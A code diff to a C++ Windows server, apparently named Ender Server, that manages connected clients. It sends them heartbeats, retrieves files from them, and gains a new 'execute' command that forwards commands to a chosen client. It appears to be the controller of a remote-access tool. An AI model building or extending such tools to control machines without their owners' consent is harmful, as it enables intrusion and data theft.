@@ -89,7 +89,8 @@ void handle_connections(LPVOID Thread_Param)
 		ClientParam.id = id_var;
 		//cout << endl << "New Connection Detected - Client ID " << id_var << endl;
 		show_update("New Connection Detected - Client ID ", id_var);
-		current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
+	//	current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
+		show_shell();
 		CreateThread(
 			NULL,
 			NULL,
@@ -119,13 +120,13 @@ void handle_client(LPVOID ClientParam)
 			handle_client_panel(client, command);
 		}
 		else {
-			command.assign("hello");
+			command.assign("hello"); // Needs to be changed. Small lag due to sleep
 			client.send_command(command);  // hello is sent after every 3 seconds to check client status
-			Sleep(3000);
+			Sleep(2000);
 		}
 	}
 	//cout << endl <<"Client with ID - " << client.get_client_id() << " disconnected" << endl;
-	show_update("Client with ID - ", client.get_client_id(), " disconnected");
+	show_update("Client with ID - ", client.get_client_id(), " Disconnected");
 	if(current_client == client.get_client_id())
 	{
 		current_client = -1;
@@ -137,7 +138,7 @@ void handle_client(LPVOID ClientParam)
 
 void admin_mode()
 {
-	cout << " Welcome to Ender Server\n";
+	cout << " Welcome";
 	display_admin_help();
 	string command;
 	getline(cin, command);
@@ -146,7 +147,7 @@ void admin_mode()
 		handle_admin_command(command);
 		cout << "# ";
 		getline(cin, command);
-		Sleep(200);
+		//Sleep(200);
 	}
 }
 
@@ -204,5 +205,9 @@ void handle_client_panel(SERVER& client, string& command)
 	{
 		client.send_command(command);
 		client.recieve_file();
+	}
+	else if(command.substr(0,8) == "execute ")
+	{
+		client.send_command(command);
 	}
 }
